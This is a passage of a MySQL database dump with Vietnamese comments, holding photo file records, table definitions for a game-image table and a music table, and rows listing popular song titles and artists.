(809, 'photo/5ef5f6163e214535f154.jpg', '', '2024-07-24 19:08:34'),
(810, 'photo/5573b386465bc70ae429.jpg', '', '2024-07-24 19:08:47'),
(811, 'photo/41f3e2f64fb0a0f28d74.jpg', '', '2024-07-24 19:08:59'),
(812, 'photo/e0542d952c1e527411eb.jpg', '', '2024-07-24 19:09:11'),
(813, 'photo/e081e110e44d96443ff4.jpg', '', '2024-07-24 19:09:22'),
(814, 'photo/efcf3f714c16ffd94594.jpg', '', '2024-07-24 19:09:34'),
(815, 'photo/d4b53f0b3fb4b3d5f873.jpg', '', '2024-07-24 19:09:46'),
(816, 'photo/a17e6721af0b55cc307b.jpg', '', '2024-07-24 19:09:59'),
(817, 'photo/04e4e669f4f7a0937604.jpg', '', '2024-07-24 19:10:11'),
(818, 'photo/6c43f960dbfd9a8606b4.jpg', '', '2024-07-24 19:10:23'),
(819, 'photo/9231d8210be9d907d723.jpg', '', '2024-07-24 19:10:35'),
(820, 'photo/146dad410c0fc8132ed8.jpg', '', '2024-07-24 19:10:47'),
(821, 'photo/bbe8b0523af21fc20340.jpg', '', '2024-07-24 19:10:58'),
(822, 'photo/843875181e8af32fa370.jpg', '', '2024-07-24 19:11:09'),
(823, 'photo/936fcdb948098fb3180e.jpg', '', '2024-07-24 19:11:23'),
(824, 'photo/d7b1517c675739accad9.jpg', '', '2024-07-24 19:11:36'),
(825, 'photo/c4df22e88d749a43ad44.jpg', '', '2024-07-24 19:11:49'),
(826, 'photo/bc6c251dc3d420e91769.jpg', '', '2024-07-24 19:12:02'),
(827, 'photo/e7a29a9a8a5a90ffb428.jpg', '', '2024-07-24 19:12:16'),
(828, 'photo/766c3645a686165991f8.jpg', '', '2024-07-24 19:12:28'),
(829, 'photo/769a90e6e9e9c80813b4.jpg', '', '2024-07-24 19:12:42'),
(830, 'photo/83a2fe6d51bc5c777dbe.jpg', '', '2024-07-24 19:12:52'),
(831, 'photo/404560891fce4f06ebcc.jpg', '', '2024-07-24 19:13:03'),
(832, 'photo/42a4826091419bdd81c4.jpg', '', '2024-07-24 19:13:16'),
(833, 'photo/b2e7948d1c7ee5974cff.jpg', '', '2024-07-24 19:13:28'),
(834, 'photo/a59552ba287663adf149.jpg', '', '2024-07-24 19:13:39'),
(835, 'photo/880cba849cf3aa721ee7.jpg', '', '2024-07-24 19:13:51'),
(836, 'photo/e0ca27d9e95e4e50fd90.jpg', '', '2024-07-24 19:14:01'),
(837, 'photo/a510e3f65ef291861304.jpg', '', '2024-07-24 19:14:12'),
(838, 'photo/f058791c625d0ce9bc18.jpg', '', '2024-07-24 19:14:23'),
(839, 'photo/4f8814d76a047c8aae6c.jpg', '', '2024-07-24 19:14:35'),
(840, 'photo/20a68bb87b46d5c505e5.jpg', '', '2024-07-24 19:14:47'),
(841, 'photo/ac5616fbfdbbdef1df05.jpg', '', '2024-07-24 19:14:58'),
(842, 'photo/2cfc53d0bcb082b87dba.jpg', '', '2024-07-24 19:15:08'),
(843, 'photo/94bc59d23d0fe97a998c.jpg', '', '2024-07-24 19:15:25'),
(844, 'photo/b1ff6678434df97ccb8e.jpg', '', '2024-07-24 19:15:36'),
(845, 'photo/9bd994ffa561ce6a6102.jpg', '', '2024-07-24 19:43:06'),
(846, 'photo/3e729b6728fb6fc6123a.jpg', '', '2024-07-24 19:43:19'),
(847, 'photo/3a8c55f8334a2978f3af.jpg', '', '2024-07-24 19:43:43'),
(848, 'photo/7664486b92f8730f5001.jpg', '', '2024-07-24 19:43:55'),
(849, 'photo/f24892c5fcc032907d0c.jpg', '', '2024-07-24 19:44:10'),
(850, 'photo/163ac2e3063c8145c6ca.jpg', '', '2024-07-24 19:44:28'),
(851, 'photo/a1ce32c7c43493e110e8.jpg', '', '2024-07-24 19:44:40'),
(852, 'photo/bddf71f609328739df03.jpg', '', '2024-07-24 19:44:54'),
(853, 'photo/ced2e3c687974b08e1bb.jpg', '', '2024-07-24 19:45:29'),
(854, 'photo/600251bc1df2d1739d8d.jpg', '', '2024-07-24 19:45:41'),
(855, 'photo/7fc2d19259313fbc5787.jpg', '', '2024-07-24 19:45:51'),
(856, 'photo/2dade038737a274cf205.jpg', '', '2024-07-24 19:46:05'),
(857, 'photo/dd72a117a73364615e1a.jpg', '', '2024-07-24 19:46:25'),
(858, 'photo/7cbcde1d1a4e4f4364b1.jpg', '', '2024-07-24 19:46:36'),
(859, 'photo/3c26d2f59b6f10db0c8d.jpg', '', '2024-07-24 19:46:47'),
(860, 'photo/5b67ce2510274090b058.jpg', '', '2024-07-24 19:46:59'),
(861, 'photo/34f5daeb4f81233cae8e.jpg', '', '2024-07-24 19:47:09'),
(862, 'photo/838823f1078fd4192351.jpg', '', '2024-07-24 19:47:20'),
(863, 'photo/7c06525df68316edaf0a.jpg', '', '2024-07-24 19:47:30'),
(864, 'photo/7b7f5c1692cbfe680c49.jpg', '', '2024-07-24 19:47:42'),
(865, 'photo/55969941ba5a81703124.jpg', '', '2024-07-24 19:47:52'),
(866, 'photo/b9a43d59f8277b5bf51d.jpg', '', '2024-07-24 19:48:02'),
(867, 'photo/a8f2a06fffce16284568.jpg', '', '2024-07-24 19:48:16'),
(868, 'photo/a8140179c308b2c61577.jpg', '', '2024-07-24 19:48:27'),
(869, 'photo/4c319792b92007f8aff7.jpg', '', '2024-07-24 19:48:37'),
(870, 'photo/3168c74aa4ac1bbbf094.jpg', '', '2024-07-24 19:49:01'),
(871, 'photo/fcdf52b45f57c59d5162.jpg', '', '2024-07-24 19:49:11'),
(872, 'photo/3357f1918a71a73c44e5.jpg', '', '2024-07-24 19:49:21'),
(873, 'photo/46e4890ce98b4db18311.jpg', '', '2024-07-24 19:49:31'),
(874, 'photo/8c23184e2b02633314e1.jpg', '', '2024-07-24 19:49:41'),
(875, 'photo/b850d44d0bfc28f1e109.jpg', '', '2024-07-24 19:49:53'),
(876, 'photo/957d66c5dbb638624b01.jpg', '', '2024-07-24 19:50:04'),
(877, 'photo/c57d541d2b8d81564047.jpg', '', '2024-07-24 19:50:15'),
(878, 'photo/7ed16ac58deee4ff346d.jpg', '', '2024-07-24 19:50:28'),
(879, 'photo/2501460ad6c89d91da34.jpg', '', '2024-07-24 19:50:39'),
(880, 'photo/677269adcb1568ade9ce.jpg', '', '2024-07-24 19:50:49'),
(881, 'photo/8b7165c3825979d8e890.jpg', '', '2024-07-24 19:50:59'),
(882, 'photo/13c164ae28c982547ec3.jpg', '', '2024-07-24 19:51:09'),
(883, 'photo/18baed346f197ee6fbf7.jpg', '', '2024-07-24 19:51:19'),
(884, 'photo/93bcf3e7d7d910cddd49.jpg', '', '2024-07-24 19:51:29'),
(885, 'photo/490b1171c47a9d112a37.jpg', '', '2024-07-24 20:39:22'),
(886, 'photo/ced64741f5d7782fd045.jpg', '', '2024-07-24 20:39:39'),
(887, 'photo/b5ded116d07619dd807d.jpg', '', '2024-07-24 20:40:00'),
(888, 'photo/a88480687e14e40d6602.jpg', '', '2024-07-24 20:40:19'),
(889, 'photo/002da3c0f3c1cfdd7f1f.jpg', '', '2024-07-24 20:40:32'),
(890, 'photo/087225956473fe91893c.jpg', '', '2024-07-24 20:40:45'),
(891, 'photo/a133f5d249a9c7f29508.jpg', '', '2024-07-24 20:40:56'),
(892, 'photo/56e4053a11a69f6c03e0.jpg', '', '2024-07-24 20:41:10'),
(893, 'photo/1a8460c94ca30e9a6336.jpg', '', '2024-07-24 20:41:23'),
(894, 'photo/104dad209c7e970806c6.jpg', '', '2024-07-24 20:41:34'),
(895, 'photo/395fbb4dfdf7591e12de.jpg', '', '2024-07-24 20:41:46'),
(896, 'photo/aa5511de4f10db37912a.jpg', '', '2024-07-24 20:41:57'),
(897, 'photo/dd649b79a4b296665ed6.jpg', '', '2024-07-24 20:42:26'),
(898, 'photo/396fb1b9e4a06ca1f4df.jpg', '', '2024-07-24 20:42:37'),
(899, 'photo/ced1ed2c2567f7549ec8.jpg', '', '2024-07-24 20:42:49'),
(900, 'photo/050caa97d28425f5e59f.jpg', '', '2024-07-24 20:43:01'),
(901, 'photo/7bf89656ea6cb651a5bd.jpg', '', '2024-07-24 20:43:15'),
(902, 'photo/47eb71fa11685b6f8974.jpg', '', '2024-07-24 20:43:26'),
(903, 'photo/31f18e2f75ee9a31e0bd.jpg', '', '2024-07-24 20:43:36'),
(904, 'photo/650726eee7bcfd99cae1.jpg', '', '2024-07-24 20:43:49'),
(905, 'photo/57569624b36fb1d9f0e4.jpg', '', '2024-07-24 20:44:03'),
(906, 'photo/8feb41511ae7b4a91e1b.jpg', '', '2024-07-24 20:44:16'),
(907, 'photo/2d3e3543423a52f49611.jpg', '', '2024-07-24 20:44:28'),
(908, 'photo/c85acbb06be7c835d592.jpg', '', '2024-07-24 20:44:41'),
(909, 'photo/1b57f24b4f5f6ece6084.jpg', '', '2024-07-24 20:44:51'),
(910, 'photo/fee81cbf558cc3c626dd.jpg', '', '2024-07-24 20:45:09'),
(911, 'photo/362b399da750bdd6e26a.jpg', '', '2024-07-24 20:45:19'),
(912, 'photo/beec6d99f19470aebb53.jpg', '', '2024-07-24 20:45:31'),
(913, 'photo/8a590ecf26c5fba90a5c.jpg', '', '2024-07-24 20:45:42'),
(914, 'photo/fd0a3ad90831a153231b.jpg', '', '2024-07-24 20:45:56'),
(915, 'photo/69bb2e0ac6a3073e218c.jpg', '', '2024-07-24 20:46:07'),
(916, 'photo/97538cd6b6693472566f.jpg', '', '2024-07-24 20:46:18'),
(917, 'photo/d2b2e4a7f720cb945ea0.jpg', '', '2024-07-24 20:46:40'),
(918, 'photo/ae5ec44b8578f7de6801.jpg', '', '2024-07-24 20:46:52'),
(919, 'photo/6819039d802c1d2b6463.jpg', '', '2024-07-24 20:47:34'),
(920, 'photo/2b6753f71e2a790f1f92.jpg', '', '2024-07-24 20:47:50'),
(921, 'photo/93911e0b4bf992d38d90.jpg', '', '2024-07-24 20:48:01'),
(922, 'photo/347a7301b2b2cae18c23.jpg', '', '2024-07-24 20:48:11'),
(923, 'photo/254f0d6962eb5bab9a73.jpg', '', '2024-07-24 20:48:23'),
(924, 'photo/3b129ccca19ecd46ab99.jpg', '', '2024-07-25 01:58:46'),
(925, 'photo/50ff78d39e696a012804.jpg', '', '2024-07-25 01:59:07'),
(926, 'photo/0d61de72c517b64765fa.jpg', '', '2024-07-25 01:59:21'),
(927, 'photo/41249e7296bd87ec1075.jpg', '', '2024-07-25 01:59:33'),
(928, 'photo/364dabb01c3b000926ce.jpg', '', '2024-07-25 01:59:46'),
(929, 'photo/3407f0e591dca03555ca.jpg', '', '2024-07-25 02:00:01'),
(930, 'photo/94cfc731fbbe2a93b612.jpg', '', '2024-07-25 02:00:13'),
(931, 'photo/37f5be863e3e9b203023.jpg', '', '2024-07-25 02:00:24'),
(932, 'photo/f52e558301064dcb7604.jpg', '', '2024-07-25 02:00:35'),
(933, 'photo/4ff10d8970fb1ea41c03.jpg', '', '2024-07-25 02:00:47'),
(934, 'photo/be170145b3040840d6a4.jpg', '', '2024-07-25 02:01:02'),
(935, 'photo/ddc323b793cb3bc2033f.jpg', '', '2024-07-25 02:01:13'),
(936, 'photo/1f96ed121a8536986a3f.jpg', '', '2024-07-25 02:01:25'),
(937, 'photo/7a7080a30634d6c0d043.jpg', '', '2024-07-25 02:01:37'),
(938, 'photo/358b58fdb27abb12c32d.jpg', '', '2024-07-25 02:01:47'),
(939, 'photo/352f701614bc7cd4c229.jpg', '', '2024-07-25 02:01:57'),
(940, 'photo/948412a44da85df2ead0.jpg', '', '2024-07-25 02:02:10'),
(941, 'photo/6c834dc46bbd70e1f5db.jpg', '', '2024-07-25 02:02:20'),
(942, 'photo/47e755383960272dc9c2.jpg', '', '2024-07-25 02:02:32'),
(943, 'photo/6c5eba79a70fb60cd8c9.jpg', '', '2024-07-25 02:02:44'),
(944, 'photo/2c29242e031a826bdf20.jpg', '', '2024-07-25 02:04:17'),
(945, 'photo/ca54d0b6ccffad61de53.jpg', '', '2024-07-25 02:04:29'),
(946, 'photo/d68975b37213e13ad2a1.jpg', '', '2024-07-25 02:04:39'),
(947, 'photo/4b8c4822b331c9893fd3.jpg', '', '2024-07-25 02:04:50'),
(948, 'photo/063fbd3f04cd0dd4e5c2.jpg', '', '2024-07-25 02:05:01'),
(949, 'photo/f6947c1fca9fd6d93c1a.jpg', '', '2024-07-25 02:05:11'),
(950, 'photo/fe7c945e8073fac1178c.jpg', '', '2024-07-25 02:05:21'),
(951, 'photo/6d1a2315eb371d346fb6.jpg', '', '2024-07-25 02:05:31'),
(952, 'photo/b4e69217125b1c1b2a2c.jpg', '', '2024-07-25 02:05:42'),
(953, 'photo/404b99268707c2121c9f.jpg', '', '2024-07-25 02:05:52'),
(954, 'photo/8625ffd9456a93423280.jpg', '', '2024-07-25 02:06:02'),
(955, 'photo/fe512159a30ad24f2850.jpg', '', '2024-07-25 02:06:14'),
(956, 'photo/ad6a9c7aabff526ec85d.jpg', '', '2024-07-25 02:06:33'),
(957, 'photo/894386899269fb9815b2.jpg', '', '2024-07-25 02:06:46'),
(958, 'photo/74e512c1612fe84bbbc1.jpg', '', '2024-07-25 02:06:59'),
(959, 'photo/5a9a02ac50684f8a3ad8.jpg', '', '2024-07-25 02:07:12'),
(960, 'photo/43a9cff73359bb7b57ff.jpg', '', '2024-07-25 02:07:23'),
(961, 'photo/7fd09224abcb82039017.jpg', '', '2024-07-25 02:07:34'),
(962, 'photo/4cc9ea54d2b8119366c9.jpg', '', '2024-07-25 02:07:46'),
(963, 'photo/2bcdba843f96817a1bae.jpg', '', '2024-07-25 02:08:02'),
(964, 'photo/13fcad8a032e411d1779.jpg', '', '2024-07-25 02:08:13'),
(965, 'photo/7a5154c137e9735a6044.jpg', '', '2024-07-25 02:08:24'),
(966, 'photo/277bad2976ae3d13c295.jpg', '', '2024-07-25 02:08:36'),
(967, 'photo/953c648adcb94aa6deab.jpg', '', '2024-07-25 02:08:49'),
(968, 'photo/3f8484679587e672004f.jpg', '', '2024-07-25 02:09:48'),
(969, 'photo/829051b313d5f98b8f96.jpg', '', '2024-07-25 02:09:58'),
(970, 'photo/cba72f8e5913b6e94a19.jpg', '', '2024-07-25 02:10:09'),
(971, 'photo/8e500ec85819d157f381.jpg', '', '2024-07-25 02:10:20'),
(972, 'photo/e2ef6b88a27d63914160.jpg', '', '2024-07-25 02:10:32'),
(973, 'photo/171abdd8491bd7eb0a87.jpg', '', '2024-07-25 02:10:43'),
(974, 'photo/fd0e328fc980801bb675.jpg', '', '2024-07-25 02:10:54'),
(975, 'photo/4407d3cbd981fa9486f2.jpg', '', '2024-07-25 02:11:04'),
(976, 'photo/509c141beb9e93920755.jpg', '', '2024-07-25 02:11:15'),
(977, 'photo/de5bd9326d5dbeffe19a.jpg', '', '2024-07-25 02:11:25'),
(978, 'photo/900da343b75b3ff682d4.jpg', '', '2024-07-25 02:11:35'),
(979, 'photo/4442f07301ecb1692a53.jpg', '', '2024-07-25 02:11:46'),
(980, 'photo/3291f8e071ab54c557b1.jpg', '', '2024-07-25 02:11:56'),
(981, 'photo/bbdc6663890e30f2edb4.jpg', '', '2024-07-25 02:12:06'),
(982, 'photo/85d6451035ddc4215138.jpg', '', '2024-07-25 02:12:16'),
(983, 'photo/d5a274ec65c184d1614a.jpg', '', '2024-07-25 02:12:26'),
(984, 'photo/99f2654e8a605204b8c7.jpg', '', '2024-07-25 12:09:59'),
(985, 'photo/afdc478b8ed084b911bf.jpg', '', '2024-07-25 12:10:13'),
(986, 'photo/d3eca312ae84a79a740d.jpg', '', '2024-07-25 12:10:30'),
(987, 'photo/4fc0ae009206459b1fbd.jpg', '', '2024-07-25 12:10:42'),
(988, 'photo/d023f0b075f5dd06e25b.jpg', '', '2024-07-25 12:10:53'),
(989, 'photo/96669980ebd215500504.jpg', '', '2024-07-25 12:11:04'),
(990, 'photo/ae3daabc891a679c0615.jpg', '', '2024-07-25 12:11:17'),
(991, 'photo/1381bb428637a2b3c830.jpg', '', '2024-07-25 12:11:29'),
(992, 'photo/0ff4525d218ece02454c.jpg', '', '2024-07-25 12:11:46'),
(993, 'photo/376f8a460fe5c8038295.jpg', '', '2024-07-25 12:12:00'),
(994, 'photo/26de795d930a808f86cb.jpg', '', '2024-07-25 12:12:13'),
(995, 'photo/889cc0eef3dba1921d1b.jpg', '', '2024-07-25 12:12:25'),
(996, 'photo/d98a9fe847d8e99e2198.jpg', '', '2024-07-25 12:12:37'),
(997, 'photo/73b50cc79d030c6781e7.jpg', '', '2024-07-25 12:12:49'),
(998, 'photo/8b2dfa972beae5eeb5e9.jpg', '', '2024-07-25 12:12:59'),
(999, 'photo/5f78459674286a4911be.jpg', '', '2024-07-25 12:13:11'),
(1000, 'photo/4d5352d196ef052e8144.jpg', '', '2024-07-25 12:13:22'),
(1001, 'photo/762b8d3b425d3d0f236c.jpg', '', '2024-07-25 12:13:32'),
(1002, 'photo/29c9fb5a58cadb964098.jpg', '', '2024-07-25 12:13:51'),
(1003, 'photo/9c0216ff7043fabdcf09.jpg', '', '2024-07-25 12:14:03'),
(1004, 'photo/681df3823d79ee0430ab.jpg', '', '2024-07-25 12:14:15'),
(1005, 'photo/f45ebdaaf5bbf1454d23.jpg', '', '2024-07-25 12:14:28'),
(1006, 'photo/979127a8f94354064476.jpg', '', '2024-07-25 12:14:40'),
(1007, 'photo/a42c69528b75883499fb.jpg', '', '2024-07-25 12:14:51'),
(1008, 'photo/519f8e646f129e57031e.jpg', '', '2024-07-25 12:15:03'),
(1009, 'photo/9df0f86147cef39e4509.jpg', '', '2024-07-25 12:15:39'),
(1010, 'photo/345cc6e46e91ac2186a9.jpg', '', '2024-07-25 12:15:53'),
(1011, 'photo/6988d6a77cc80d0a112a.jpg', '', '2024-07-25 12:16:05'),
(1012, 'photo/b5f8c917cfbdb785c1da.jpg', '', '2024-07-25 12:16:16'),
(1013, 'photo/5e270ce04b1dac4ffb24.jpg', '', '2024-07-25 12:16:28'),
(1014, 'photo/a410591339926a090096.jpg', '', '2024-07-25 12:16:40'),
(1015, 'photo/6bed2f52a17ed2ba354d.jpg', '', '2024-07-25 12:16:53'),
(1016, 'photo/9a8b8fac21720ba9d58b.jpg', '', '2024-07-25 12:17:04'),
(1017, 'photo/8b92dd64272e415c3c18.jpg', '', '2024-07-25 12:17:16'),
(1018, 'photo/ebb5c90182aee40614f0.jpg', '', '2024-07-25 12:17:28'),
(1019, 'photo/6895ba6ca2b80b943b34.jpg', '', '2024-07-25 12:17:40'),
(1020, 'photo/ba9551d0e41e64bd6330.jpg', '', '2024-07-25 12:17:51'),
(1021, 'photo/01ad8ae75dacb9b4d478.jpg', '', '2024-07-25 12:18:02'),
(1022, 'photo/bad0da3ec4376c8775b7.jpg', '', '2024-07-25 12:18:13'),
(1023, 'photo/7f2fd0aa20027405b30d.jpg', '', '2024-07-25 12:18:32'),
(1024, 'photo/817644dde358b23411d4.jpg', '', '2024-07-25 12:18:45'),
(1025, 'photo/a5f2499ff52eecc51c39.jpg', '', '2024-07-25 12:19:03'),
(1026, 'photo/8808539888cbb64b4de8.jpg', '', '2024-07-25 12:19:17'),
(1027, 'photo/17de4e27c7b4bde17a03.jpg', '', '2024-07-25 12:19:32'),
(1028, 'photo/e0f401bd6f7ebb3bd61e.jpg', '', '2024-07-25 12:19:44'),
(1029, 'photo/c1f92e1804beae24690c.jpg', '', '2024-07-25 12:19:54'),
(1030, 'photo/227ffa44ed8cc0e91b53.jpg', '', '2024-07-25 12:20:06'),
(1031, 'photo/b7fd857c4438f0a9bcf2.jpg', '', '2024-07-25 12:20:17'),
(1032, 'photo/1fe701f853a1e712c4d4.jpg', '', '2024-07-25 12:20:27'),
(1033, 'photo/99d7d73299529a6d90df.jpg', '', '2024-07-25 12:20:38'),
(1034, 'photo/e8a11047f3ac05b16556.jpg', '', '2024-07-25 12:20:50'),
(1035, 'photo/9853f7acc6dbe472c9ce.jpg', '', '2024-07-25 12:21:00'),
(1036, 'photo/edceb9a7cab014868a1a.jpg', '', '2024-07-25 12:21:10'),
(1037, 'photo/8c0ff441496e7dfe7d7f.jpg', '', '2024-07-25 12:21:23'),
(1038, 'photo/4e208aa8cb13eaef8cf9.jpg', '', '2024-07-25 12:21:34'),
(1039, 'photo/76d689f930a165fde67a.jpg', '', '2024-07-25 12:21:45'),
(1040, 'photo/06f3580c1445927996fa.jpg', '', '2024-07-25 12:21:56'),
(1041, 'photo/e1cdceea281773762572.jpg', '', '2024-07-25 12:22:08'),
(1042, 'photo/331baec085edf2f3aeb5.jpg', '', '2024-07-25 12:22:18'),
(1043, 'photo/d4e46a1e72d80ec10ec1.jpg', '', '2024-07-25 12:22:28');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `image_design_games`
--

CREATE TABLE `image_design_games` (
  `id` bigint NOT NULL,
  `images` text NOT NULL,
  `author` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `time_upload` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `music`
--

CREATE TABLE `music` (
  `id` bigint NOT NULL,
  `Name_music` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `Image` varchar(255) NOT NULL,
  `content_music` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `Status_download` varchar(15) NOT NULL,
  `times` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `music`
--

INSERT INTO `music` (`id`, `Name_music`, `author`, `Image`, `content_music`, `Status_download`, `times`) VALUES
(1, 'windy hill', '', '', '', 'complete', '2024-05-01 04:03:48'),
(2, 'someone you loved\r\n', 'lewis capaldi', '', '', 'complete', '2024-05-01 09:02:30'),
(3, 'dancin with your ghost', 'Sasha Alex Sloan', '', '', 'complete', '2024-05-01 09:04:41'),
(4, 'Xomu - Lanterns\r\n', 'Miyuri Remix', '', '', 'complete', '2024-05-01 09:13:30'),
(5, 'leave the door open', 'Bruno Mars, Anderson .Paak, Silk Sonic', '', '', 'complete', '2024-05-01 09:18:57'),
(6, 'Cradles', 'Sub Urban', '', '', 'complete', '2024-05-01 09:20:54'),
(7, 'at my worst', 'Pink Sweat$', '', '', 'complete', '2024-05-01 09:23:26'),
(8, 'Larg', 'ELGIT DODA', '', '', 'complete', '2024-05-01 09:25:04'),
(9, 'rise and fall', 'Camelot', '', '', 'complete', '2024-05-01 09:27:17'),
(10, 'cupid', 'FIFTY FIFTY', '', '', 'complete', '2024-05-01 09:29:09'),
(11, 'hero cash cash', '', '', '', 'complete', '2024-05-01 04:17:17'),
(12, 'love is gone\r\n', 'slander, dylan matthew', '', '', 'complete', '2024-05-02 12:11:56'),
(13, 'You Approaching Nirvana', '', '', '', 'complete', '2024-05-02 12:13:49'),
(14, 'Never Be Alone', '', '', '', 'complete', '2024-05-02 12:18:08'),
(15, 'Somebody That I Used To Know', 'Gotye', '', '', 'complete', '2024-05-02 12:19:42'),
(16, 'Thunder', 'Gabry Ponte, LUM!X, Prezioso', '', '', 'complete', '2024-05-11 11:57:43'),
(27, 'sold out', 'hawk nelson', '', '', '', '2024-04-29 05:47:46'),
(28, 'east of eden', '', '', '', '', '2024-04-29 05:59:21'),
(30, 'Bad Liar', 'Imagine Dragons', '', '', '', '2024-04-30 04:17:29'),
(31, 'Let Me Down Slowly', 'Alec Benjamin', '', '', '', '2024-04-30 04:18:01'),
(32, 'End of Time', 'K-391, Alan Walker & Ahrix', '', '', '', '2024-04-30 04:18:31'),
(38, 'Lost Control', 'Alan Walker', '', '', '', '2024-04-30 04:22:58'),
(39, 'The Night', 'Avicii', '', '', '', '2024-04-30 04:23:20'),
(40, 'Love Me Like You Do', 'Ellie Goulding', '', '', '', '2024-04-30 04:23:48'),
(42, 'Yêu Được Không', 'Đức Phúc x Viruss', '', '', '', '2024-04-30 04:26:02'),
(43, 'có hẹn với thanh xuân', 'GREY D, HOÀNG DŨNG, ORANGE, SUNI HẠ LINH & TLINH', '', '', '', '2024-04-30 04:26:35'),
(44, 'trời giấu trời mang đi', 'Amee x Viruss', '', '', 'complete', '2024-05-01 09:51:49'),
(45, 'tìm nhau không', 'tăng phúc', '', '', 'complete', '2024-05-01 03:57:21'),
(46, 'chạm khẽ tim anh một chút thôi', 'Noo phước thịnh', '', '', 'complete', '2024-05-01 08:59:49'),
(48, 'chỉ bằng cái gật đầu', 'yan nguyễn', '', '', 'complete', '2024-05-01 21:41:24'),
(49, 'mây đêm chờ mấy đêm', '', '', '', '', '2024-05-01 21:34:36'),
(50, 'Heroes Tonight', 'Janji', '', '', 'complete', '2024-05-02 12:33:22'),
(51, 'On & On', 'Cartoon, Jéja', '', '', 'complete', '2024-05-02 12:35:27'),
(52, 'Fly Away ', 'feat. Anjulie', '', '', 'complete', '2024-05-02 12:36:49'),
(53, 'Monody ', 'feat. Laura Brehm', '', '', 'complete', '2024-05-02 12:38:43'),
(54, 'Close To The Sun', '', '', '', 'complete', '2024-05-02 12:42:39'),
(55, 'Rise Up', '', '', '', 'complete', '2024-05-02 12:43:41'),
(56, 'Cloud 9', '', '', '', 'complete', '2024-05-02 12:45:25'),
(57, ' Nevada', 'Vicetone', '', '\"I\'ve been painting every fence I know<br>Every color bleeds into the same<br>cause before you go and walk away<br>yeah, you better know where you\'re going<br>hey ya, hey ya<br>you\'re a wanderer,just like me<br>hey ya, hey ya<br>yeah, you better know where you\'re going<br>[music]<br>yeah, you better know where you\'re going<br>[music]<br>I\'ve been painting every fence I know<br>Every color bleeds into the same<br>Cause before you go and walk away<br>yeah, you better know where you\'re going<br>hey ya, hey ya<br>you\'re a wanderer just like me<br>hey ya,hey ya<br>yeah, you better know where you\'re going<br>[music]<br>(you\'re a wanderer just like me)<br>[music]<br>yeah, you better know where you\'re going<br>hey ya, hey ya<br>you\'re a wanderer just like me<br>hey ya, hey ya<br>yeah, you better know where you\'re going<br>[music]<br>yeah, you better know where you\'re going<br>yeah, you better know where you\'re going<br>you\'re a wanderer just like me<br>yeah, you better know where you\'re going<br>you\'re a wanderer just like me<br>[music]<br>yeah, you better know where you\'re going<br>you\'re a wanderer just like me<br>\"', 'complete', '2024-05-08 02:29:07'),
(58, 'Haru haru', 'Bigbag', '', '', '', '2024-05-03 01:00:29'),
(59, 'waka waka', 'Shakira', '', '', '', '2024-05-04 04:40:54'),
(60, 'Señorita\r\n', 'Shawn Mendes, Camila Cabello', '', '', '', '2024-05-04 04:42:09'),
(61, 'Don\'t You Worry Child', 'Swedish House Mafia ft. John Martin', '', '', '', '2024-05-04 04:46:14'),
(62, 'Lost Sky - Dreams pt. II', '', '', '', '', '2024-05-04 04:47:30'),
(63, 'Lost Sky - Where We Started', '', '', '', '', '2024-05-04 04:48:12'),
(64, 'Lost Sky - Fearless pt.II', '', '', '', '', '2024-05-04 04:49:01'),
(65, 'mỹ nhân', '', '', '', '', '2024-05-04 04:50:07'),
(66, 'holiday remix', '', '', '', '', '2024-05-04 04:50:17'),
(67, 'Force', 'Alan Walker', '', '', '', '2024-05-04 04:53:35'),
(68, ' Into Your Arms ', 'Witt Lowry -(feat. Ava Max)', '', '', '', '2024-05-04 11:17:12'),
(69, 'Summertime [Sunshine]', 'K-391', '', '', '', '2024-05-04 11:20:25'),
(70, 'On the floor', '', '', '', '', '2024-05-04 11:21:11'),
(71, 'memories', '', '', '', '', '2024-05-04 11:21:26'),
(72, 'My Heart', '', '', '', '', '2024-05-04 11:23:51'),
(73, 'Candyland', '', '', '', '', '2024-05-04 11:24:40'),
(74, 'Hope', '', '', '', '', '2024-05-04 11:25:52'),
(75, 'Closer', '', '', '', '', '2024-05-05 05:20:40'),
(76, 'lily', '', '', '', '', '2024-05-05 05:23:15'),
(77, 'Sky High', '', '', '', '', '2024-05-05 05:24:16'),
(78, 'some thing just like this', '', '', '', '', '2024-05-05 05:25:20'),
(79, 'save me', '', '', '', '', '2024-05-05 22:27:47'),
(80, 'with you (ngẫu hứng)', '', '', '', '', '2024-05-06 13:38:12'),
(81, 'cứ chill thôi', '', '', '', '', '2024-05-06 14:12:25'),
(82, 'yêu được không', 'Đức phúc', '', '', '', '2024-05-06 14:12:39'),
(83, 'Astronaut In The Ocean', 'Masked Wolf', '', '', '', '2024-05-07 01:48:27'),
(84, 'gặp người đúng lúc', '', '', '', '', '2024-05-07 01:50:11'),
(85, 'nhất tiếu giang hồ', '', '', '', '', '2024-05-07 03:15:45'),
(86, 'anh không đòi quà', '', '', '', '', '2024-05-07 03:46:48'),
(87, 'and just enjoy - the show', 'lenka', '', '', '', '2024-05-07 05:29:29'),
(88, 'trouble is a friend', 'lenka', '', '', '', '2024-05-07 05:32:05'),
(89, 'Send it', '', '', '', '', '2024-05-07 05:32:30'),
(90, 'way back home', '', '', '', '', '2024-05-07 05:32:55'),
(91, 'shape of you', '', '', '', '', '2024-05-07 05:33:10'),
(92, 'Despacito', '', '', '', '', '2024-05-07 05:33:29'),
(93, 'Attention', '', '', '', '', '2024-05-07 05:33:45'),
(94, 'Pretty Girl', '', '', '', '', '2024-05-07 05:34:25'),
(95, 'Please Don\'t Go', '', '', '', '', '2024-05-07 05:36:35'),
(96, 'reality', '', '', '', '', '2024-05-07 05:37:06'),
(97, 'một triệu khả năng', '', '', '', '', '2024-05-07 06:08:57'),
(98, 'A y mạc', '', '', '', '', '2024-05-07 06:09:04'),
